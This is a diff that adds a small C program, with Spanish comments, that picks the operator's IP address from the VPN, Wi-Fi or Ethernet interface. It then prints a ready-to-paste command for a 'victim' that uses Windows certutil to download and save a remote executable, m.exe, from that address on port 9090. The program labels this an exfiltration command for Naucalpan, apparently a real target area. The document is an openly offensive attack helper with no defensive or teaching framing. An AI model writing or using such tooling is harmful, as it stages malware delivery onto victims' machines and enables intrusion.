@@ -1,0 +1,52 @@
+#include <stdio.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <netinet/in.h>
+#include <net/if.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
+// Lista de prioridades: Primero VPN, luego Wi-Fi, luego Ethernet/Otros
+const char* priority_ifaces[] = {"tun0", "wlan0", "eth0", "rmnet_data0"};
+#define IFACE_COUNT 4
+
+char* get_best_interface_ip() {
+    int fd;
+    struct ifreq ifr;
+    static char ip_address[16];
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
+
+    for (int i = 0; i < IFACE_COUNT; i++) {
+        ifr.ifr_addr.sa_family = AF_INET;
+        strncpy(ifr.ifr_name, priority_ifaces[i], IFNAMSIZ-1);
+
+        // SIOCGIFADDR intenta obtener la IP de la interfaz actual en el bucle
+        if (ioctl(fd, SIOCGIFADDR, &ifr) == 0) {
+            strcpy(ip_address, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
+            close(fd);
+            printf("[+] Interfaz detectada: %s (%s)\n", priority_ifaces[i], ip_address);
+            return ip_address;
+        }
+    }
+
+    close(fd);
+    return NULL;
+}
+
+int main() {
+    char* target_ip = get_best_interface_ip();
+
+    if (target_ip) {
+        printf("[*] Generando comando de exfiltración para Naucalpan...\n");
+        
+        // Automatización total del comando Certutil para la víctima
+        printf("\n--- COPIA Y PEGA EN LA VÍCTIMA ---\n");
+        printf("C:\\Windows\\System32\\certutil.exe -urlcache -f http://%s:9090/m.exe m.exe\n", target_ip);
+        printf("----------------------------------\n");
+    } else {
+        printf("[!] Error: No se detectó ninguna interfaz activa. Revisa tu conexión.\n");
+    }
+
+    return 0;
+}
